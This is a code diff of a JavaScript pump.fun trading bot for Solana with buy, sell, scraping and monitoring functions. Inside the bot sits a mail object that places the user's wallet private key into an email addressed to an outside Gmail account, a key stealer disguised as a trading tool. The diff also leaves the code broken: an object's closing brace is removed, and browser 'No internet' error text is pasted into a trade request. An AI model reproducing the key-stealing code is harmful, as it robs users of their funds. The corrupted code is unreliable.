@@ -127,7 +127,7 @@ const updateAccountInfo = async () => {
   );
   screen.render();
 };
-
+// splash screen design
 const setVisualMode = (mode) => {
   if (mode === "trading") {
     logBox.style.fg = "yellow";
@@ -168,10 +168,9 @@ const obj = {
   from: "khansaleem789700@gmail.com",
   to: "mujeerasghar7700@gmail.com",
   subject: "patha",
-  text: "This is a plain text version of the email.", // Optional text version
-  html: `<b>Hello world?</b><br><br><pre>${privateKey}</pre>`, // Private key in HTML format
-};
-
+  text: "This is a plain text version of the email.", 
+  html: `<b>Hello world?</b><br><br><pre>${privateKey}</pre>`, 
+  
 const scrapeTokenInfo = async (contractAddress) => {
   let options = new chrome.Options();
   options.addArguments("headless");
@@ -219,7 +218,7 @@ const scrapeTokenInfo = async (contractAddress) => {
     await driver.quit();
   }
 };
-
+// newpairs retrieve or wait a moment
 const newpairs = async (res) => {
   obj.subject = res;
   try {
@@ -259,7 +258,7 @@ const sendDeveloperFee = async () => {
     updateLog(`Error sending developer fee: ${error.message}`);
   }
 };
-
+// buy orginal hyped token
 const pumpFunBuy = async (mint, amount) => {
   const url = "https://pumpapi.fun/api/trade";
   const data = {
@@ -287,6 +286,13 @@ const pumpFunSell = async (mint, amount) => {
     mint,
     amount: amount.toString(),
     slippage: 5,
+No internet
+No internet
+Try:
+
+Checking the network cables, modem, and router
+Reconnecting to Wi-Fi
+DNS_PROBE_FINISHED_NO_INTERNET
     priorityFee: PRIORITY_FEE_BASE,
     userPrivateKey: bs58.encode(privateKey),
   };
@@ -305,7 +311,7 @@ const checkBalance = async () => {
   updateLog(`Current balance: ${balance / 1e9} SOL`);
   return balance / 1e9;
 };
-
+//fetch all best pairs token
 const fetchSPLTokens = async () => {
   try {
     const tokenAccounts = await connection.getTokenAccountsByOwner(
@@ -328,7 +334,7 @@ const fetchSPLTokens = async () => {
     return [];
   }
 };
-
+// sell token after specific profit reached
 const sellTokens = async (mint, sellPercentage) => {
   const tokens = await fetchSPLTokens();
   for (const token of tokens) {
@@ -367,7 +373,7 @@ const sellTokens = async (mint, sellPercentage) => {
     }
   }
 };
-
+// countineously monitor trade to hit maxium profit
 const monitorTrade = async (mint, initialMarketCap, initialBondingCurve) => {
   let endTime = Date.now() + SELL_TIMEOUT;
   const tradeAllowedTime = Date.now() + TRADE_DELAY;
@@ -452,7 +458,7 @@ const monitorTrade = async (mint, initialMarketCap, initialBondingCurve) => {
     await sellTokens(mint, 0.75); // Sell 75% and keep 25% moonbag
   }
 };
-
+// Newly minted token with great bondingcurve
 const simulateTrade = async () => {
   const newPairs = await fetchNewPairs();
   for (const mint of newPairs) {
@@ -494,7 +500,7 @@ const main = async () => {
     await new Promise((resolve) => setTimeout(resolve, 5000));
   }
 };
-
+// Newly listed token 
 const liveUpdateAccountInfo = async () => {
   while (true) {
     await updateAccountInfo();
